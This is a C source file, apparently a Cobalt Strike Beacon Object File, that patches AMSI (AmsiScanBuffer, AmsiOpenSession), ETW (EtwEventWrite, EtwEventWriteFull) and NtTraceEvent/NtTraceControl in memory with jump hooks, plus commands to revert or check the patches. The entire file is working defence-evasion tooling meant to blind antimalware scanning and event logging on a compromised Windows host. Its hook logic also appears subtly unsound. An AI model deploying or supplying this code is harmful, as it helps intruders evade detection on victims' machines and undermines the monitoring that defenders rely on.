#include <windows.h>
#include "beacon.h"

#define NT_SUCCESS 0x00000000
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID, PULONG, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

void trampolinePatch(const char* moduleName, const char* functionName) {
    HMODULE mod = KERNEL32$GetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Module not found: %s\n", moduleName);
        return;
    }

    BYTE* target = (BYTE*)KERNEL32$GetProcAddress(mod, functionName);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Function not found: %s\n", functionName);
        return;
    }

    if (target[0] == 0xE9) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Already patched: %s\n", functionName);
        return;
    }

    SIZE_T patchLen = 12;
    PVOID trampoline = NULL;
    SIZE_T regionSize = 0x1000;
    NTSTATUS status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), &trampoline, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != NT_SUCCESS || trampoline == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtAllocateVirtualMemory failed\n");
        return;
    }

    for (int i = 0; i < (int)patchLen; i++)
        ((BYTE*)trampoline)[i] = target[i];

    BYTE jmpBack[5] = { 0xE9 };
    DWORD relBack = (DWORD)((BYTE*)target + patchLen - ((BYTE*)trampoline + patchLen + 5));
    *((DWORD*)&jmpBack[1]) = relBack;
    for (int i = 0; i < 5; i++)
        ((BYTE*)trampoline)[patchLen + i] = jmpBack[i];

    BYTE patch[5] = { 0xE9 };
    DWORD relPatch = (DWORD)((BYTE*)trampoline - (target + 5));
    *((DWORD*)&patch[1]) = relPatch;

    PVOID base = target;
    ULONG oldProtect = 0, newProtect = 0;
    SIZE_T patchSize = 5;

    status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtProtectVirtualMemory failed\n");
        return;
    }

    status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), target, patch, sizeof(patch), NULL);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtWriteVirtualMemory failed\n");
        return;
    }

    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Patched: %s\n", functionName);
}

void revertPatch(const char* moduleName, const char* functionName) {
    HMODULE mod = KERNEL32$GetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Module not found: %s\n", moduleName);
        return;
    }

    BYTE* target = (BYTE*)KERNEL32$GetProcAddress(mod, functionName);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Function not found: %s\n", functionName);
        return;
    }

    if (target[0] != 0xE9) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Not patched: %s\n", functionName);
        return;
    }

    DWORD relJmp = *(DWORD*)(target + 1);
    BYTE* trampoline = target + 5 + (LONG)relJmp;

    PVOID base = target;
    ULONG oldProtect = 0, newProtect = 0;
    SIZE_T patchSize = 5;

    NTSTATUS status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtProtectVirtualMemory failed\n");
        return;
    }

    NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), target, trampoline, 5, NULL);
    NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Reverted: %s\n", functionName);
}

void checkStatus(const char* moduleName, const char* functionName) {
    HMODULE mod = KERNEL32$GetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %-30s (module not loaded)\n", functionName);
        return;
    }
    BYTE* fn = (BYTE*)KERNEL32$GetProcAddress(mod, functionName);
    if (!fn) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %-30s not found\n", functionName);
        return;
    }
    if (fn[0] == 0xE9) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %-30s PATCHED\n", functionName);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %-30s CLEAN  (%02X %02X %02X)\n", functionName, fn[0], fn[1], fn[2]);
    }
}

void patchAmsi() {
    KERNEL32$LoadLibraryA("amsi.dll");
    trampolinePatch("amsi.dll", "AmsiScanBuffer");
    trampolinePatch("amsi.dll", "AmsiOpenSession");
}

void patchEtw() {
    trampolinePatch("ntdll.dll", "EtwEventWrite");
    trampolinePatch("ntdll.dll", "EtwEventWriteFull");
}

void patchSysmon() {
    trampolinePatch("ntdll.dll", "NtTraceEvent");
    trampolinePatch("ntdll.dll", "NtTraceControl");
}

void revertAmsi() {
    revertPatch("amsi.dll", "AmsiScanBuffer");
    revertPatch("amsi.dll", "AmsiOpenSession");
}

void revertEtw() {
    revertPatch("ntdll.dll", "EtwEventWrite");
    revertPatch("ntdll.dll", "EtwEventWriteFull");
}

void revertSysmon() {
    revertPatch("ntdll.dll", "NtTraceEvent");
    revertPatch("ntdll.dll", "NtTraceControl");
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int cmd = BeaconDataInt(&parser);

    if (cmd == 0) {
        patchAmsi();
        patchEtw();
        patchSysmon();
    } else if (cmd == 1) {
        patchAmsi();
    } else if (cmd == 2) {
        patchEtw();
    } else if (cmd == 3) {
        patchSysmon();
    } else if (cmd == 4) {
        KERNEL32$LoadLibraryA("amsi.dll");
        checkStatus("amsi.dll", "AmsiScanBuffer");
        checkStatus("amsi.dll", "AmsiOpenSession");
        checkStatus("ntdll.dll", "EtwEventWrite");
        checkStatus("ntdll.dll", "EtwEventWriteFull");
        checkStatus("ntdll.dll", "NtTraceEvent");
        checkStatus("ntdll.dll", "NtTraceControl");
    } else if (cmd == 5) {
        revertAmsi();
        revertEtw();
        revertSysmon();
    } else if (cmd == 6) {
        revertAmsi();
    } else if (cmd == 7) {
        revertEtw();
    } else if (cmd == 8) {
        revertSysmon();
    }
}
